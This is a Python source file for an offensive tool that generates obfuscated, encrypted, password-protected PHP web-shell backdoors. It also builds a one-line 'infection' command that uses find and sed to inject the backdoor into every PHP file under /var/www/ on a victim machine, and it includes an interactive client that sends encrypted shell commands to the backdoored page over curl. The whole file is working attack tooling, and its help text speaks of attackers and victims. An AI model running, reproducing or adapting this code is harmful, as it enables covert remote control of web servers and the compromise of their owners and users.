#!/usr/bin/env python3
import prompt_toolkit
from prompt_toolkit.patch_stdout import patch_stdout
import colored
import subprocess
import argparse
import hashlib
import base64
import binascii
import urllib.parse
import shlex

import string
import random
import sys

def rand_pass(size=32, use_digits=True):
    digits = ""
    if use_digits:
        digits = string.digits 
    return ''.join(random.choices(string.ascii_letters + digits, k=size))

def encrypt(key, msg):
    #print("encrypt")
    #print(key)
    key = [ord(c) for c in key]
    #print(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0

    msg = [ord(c) if not type(c) is int else c for c in msg]
    res = bytearray()
    for c in msg:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        next_key = S[(S[i] + S[j]) % 256]
        #print("{}^{}={}".format(next_key, c, c ^ next_key))
        res.append(c ^ next_key)
    return res

def decrypt(key, msg):
    #print("decrypt")
    return encrypt(key, msg)

def main():
    examples = '''

-------------------------------------------------------------------------------
Usage Examples
-------------------------------------------------------------------------------
# Use -g (--generate ) to create a PHP backdoor and write it to STDOUT.
# The command to connect to it is written to STDERR and should be saved.

Recommended:
# Generate a password-protected, encrypted, obfuscated PHP backdoor
# When possible, -p and -k should always be used.
{0} -p -k -o --generate

Minimal:
# Generate a simple, unauthenticated PHP backdoor with no bells or whistles
{0} --generate

sed friendly:
{0} -p -o -r --generate

For passing to other obfuscators / cryptors / encoders:
{0} -p -k -r --generate

Standalone, heavily obfuscated backdoor page:
{0} -p -k -oooo --generate 

Generate infection oneliner:
# Run on attacker's machine
# It will output the command to run on the victim's machine
# NOTE: -o and -p are HIGHLY recommended in this mode to avoid quoting issues and preserve site functionality.
{0} -p -k -o -i
'''.format(__file__)
    parser=argparse.ArgumentParser(description='A simple client to communicate with custom PHP backdoors',
        epilog=examples,
        formatter_class = argparse.RawDescriptionHelpFormatter)

    parser.add_argument('-u',"--url", help="The url of the backdoored page")
    parser.add_argument('-g', "--generate", action="store_true", help="Generate a PHP backdoor with a random password and exit.")

    parser.add_argument('-a',"--agent", default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36', 
        required=False, help="The User Agent String to use")
    parser.add_argument('-p',"--password", default="", const=rand_pass(), action='store', nargs='?', help="A disposable password to activate the backdoor. If -p and --generate are set, but no password is provided, a random one will be generated. If you are connecting to an existing backdoor, you must use the same password it was generated with")
    parser.add_argument('-t',"--password_key", default="token", help="The POST key that will contain the password value. Default: token")
    parser.add_argument('-c',"--cmd_key", default="id", help="The POST key that will contain the command value. Default: id")

    parser.add_argument("-o", "--obfuscate", default=0, action="count", help="Obfuscate PHP backdoor. Use add more o's to increase obfuscation (and size). Use with --generate")
    parser.add_argument("-v", "--verbose", default=0, action="count", help="Add additional output for debugging (keys used, size of data, etc.)")
    parser.add_argument("-k", "--key", default="", const=rand_pass(), action='store', nargs='?', help="Encrypt communications. If -k and --generate are set but no key is provided, a random one will be generated. If you are connecting to an existing backdoor, you must use the same key it was generated with")
    parser.add_argument("-r", "--raw", action="store_true", help="Output only raw PHP code without PHP tags. Use with --generate")

    parser.add_argument("-m", "--manual", action="store_true", help="By default, every command sent will be wrapped like this for convenience: EXECUTABLE -c 'exec 2>&1; CMD'. This option disables this behavior. WARNING: any uncaptured error messages will be written to /var/log/apache2/error.log in plaintext, so use this option carefully.")
    parser.add_argument("-e", "--executable", default="/bin/bash", help="The executable to use when running commands on the victim. Default is /bin/bash. Use with -m")

    parser.add_argument("-i", "--infect", action="store_true", help="Generate an infection command that can be run on a victim's machine to backdoor existing webpages.")

    args = parser.parse_args()

    if not any([args.url, args.generate, args.infect]):
        print("At least one of -u (--url), -g (--generate), -i (--infect) must be set")
        parser.print_help()
        sys.exit(1)
    if args.infect:
        args.generate = args.infect

    if args.generate:
        php = """echo {EXEC_CMD};"""
        cryptor = """function e($key, $str) {
    $s = array();
    for ($i = 0; $i < 256; $i++) {
        $s[$i] = $i;
    }
    $j = 0;
    for ($i = 0; $i < 256; $i++) {
        $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
        $x = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $x;
    }
    $i = 0;
    $j = 0;
    $res = '';
    for ($y = 0; $y < strlen($str); $y++) {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $x = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $x;
        $res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
    }
    return $res;
};
""".replace("\n","").replace("  ","")
        #TODO Refactor

        exec_cmd = "shell_exec({})"
        get_cmd = "base64_decode($_POST['{CMD_KEY}'])".replace("{CMD_KEY}", args.cmd_key)

        get_key = ""
        if args.key:
            get_key = r'$k=explode("\n", e("{}", {}), 2)[0];$d=substr({}, strlen($k)+1);'.format(args.key, get_cmd, get_cmd)
            exec_cmd = "e({}, {})".format("$k", exec_cmd) 
            get_cmd = "e({}, {})".format("$k", "$d")
       
        php = get_key + php.replace("{EXEC_CMD}", "base64_encode({})".format(exec_cmd.format(get_cmd)))

        #if args.encode:
        #    php = "eval(base64_decode('{}'));".format(base64.b64encode(php.encode()).decode())

        for i in range(args.obfuscate):
            k = rand_pass()
            encoded = base64.b64encode(encrypt(k, php)).decode()
            if args.obfuscate > 2:
                chunk_len = 16
                chunks = [(i, rand_pass(size=6, use_digits=False), encoded[i:i+chunk_len]) for i in range(0, len(encoded), chunk_len)]
                random.shuffle(chunks)
                tmp = ""
                for i in range(len(chunks)):
                    tmp = tmp + "${}='{}';\n".format(chunks[i][1], chunks[i][2])
                php = tmp #+ cryptor
                encoded = "$"+".$".join([c[1] for c in sorted(chunks)])
            else:
                encoded = "'{}'".format(encoded)
                php = "" #cryptor
            php = php + "eval(e('{}', base64_decode({})));".format(k, encoded)
            php = "eval(base64_decode('{}'));".format(base64.b64encode(php.encode()).decode())

        if args.key or args.obfuscate:
            php = cryptor + php
           
        php = "error_reporting(0);{}exit(0);".format(php)
        if args.password:
            php = "if({CHECK_PASS}){ {PHP} };".replace("{PHP}", php)
            php = php.replace("{CHECK_PASS}", "isset($_POST['{TOKEN}']) &&  hash('sha256', $_POST['{TOKEN}']) == '{PASSWORD_HASH}'")

        php = php.replace("{PASSWORD_HASH}", hashlib.sha256(args.password.encode()).hexdigest())
        php = php.replace("{CMD_KEY}", args.cmd_key)
        php = php.replace("{TOKEN}", args.password_key)

        if args.obfuscate:
            php = "eval(base64_decode('{}'));".format(base64.b64encode(php.encode()).decode())

        if args.infect:
            # find /var/www/ -name '*.php' | while read -r f; do sed -i 's|<?php|<?php $(./php_shell.py -p -o -r --generate | sed 's/\&/\\&/g' | sed """s/\x27/\x27\x5c\x27\x27/g""")|' \$f ; done 
            finder = "find /var/www/ -name '*.php' | while read -r f; do {} ; done"
            sed = 'sed -i {}'
            pattern = 's|<?php|<?php {}|'
            for c in '&':
                php = php.replace(c, '\\'+c)
            replacement = php
            print(pattern.format(replacement))
            pattern = shlex.quote(pattern.format(replacement)) + ' $f'
            php = finder.format(sed.format(pattern))
            
        else:
            if not args.raw:
                php = "<?php {} ?>".format(php.strip('\r\n \t'))

        if not args.url:
            args.url = colored.fg("red")+"URL"+colored.fg("light_yellow")
        usage = __file__ + " -u {} -c {}".format(args.url, args.cmd_key)
        if args.password:
            usage = usage + " -p {} -t {}".format(args.password, args.password_key)
        if args.key:
            usage = usage + " -k {}".format(args.key)
            

        sys.stderr.write(colored.fg("light_yellow")+usage+colored.attr("reset")+"\n" )
        sys.stderr.flush()
        print(php)
        return

    template = """curl -s -k -A '{}' -d "{}={}&{}={}" {}""".format(
            args.agent,
            args.password_key,
            args.password,
            args.cmd_key,
            "{}",
            args.url
    )
    session=prompt_toolkit.PromptSession()

    def run(cmd, key=None):
        if args.verbose > 0:
            print("Sending: {}".format( cmd))
        output = subprocess.check_output(cmd,
            stderr=subprocess.STDOUT,
            shell=True,
            executable='/bin/bash')
        if args.verbose > 0:
            print("{} raw bytes received".format(len(output)))
        output = base64.b64decode(output)
        if key:
            output = decrypt(key, output)
            if args.verbose > 0:
                print("{} plaintext bytes received".format(len(output.decode())))
        return output.decode()


    while True:
        try:
            with patch_stdout():
                cmd = session.prompt(">") #.rstrip("\n")
                if not args.manual:
                    cmd = "{} -c {}".format(args.executable, shlex.quote("exec 2>&1; {}".format(cmd)))
                tmp_key = None
                if args.key:
                    #print(args.key)
                    tmp_key = rand_pass(size=random.randint(32,128))
                    if args.verbose > 0:
                        print("tmp_key ({}): {}".format(len(tmp_key), tmp_key))
                    cmd = encrypt(args.key, tmp_key+"\n") + encrypt(tmp_key, cmd)
                else:
                    cmd = cmd.encode()
                tmp = "".join("\\"+hex(c)[1:] for c in cmd)
                #print(tmp)
                #cmd = "$'{}'".format(tmp)
                #print("CMD ({} bytes): {}".format(len(cmd), cmd))

                cmd = base64.b64encode(cmd).decode()
                #print("Base64: {}".format(cmd))
                cmd = urllib.parse.quote_plus(cmd)
                output = run(template.format(cmd), tmp_key)
                print(output)
        except Exception as e:
            import traceback
            traceback.print_exc()
            print(e)

if __name__ == "__main__":
    main()
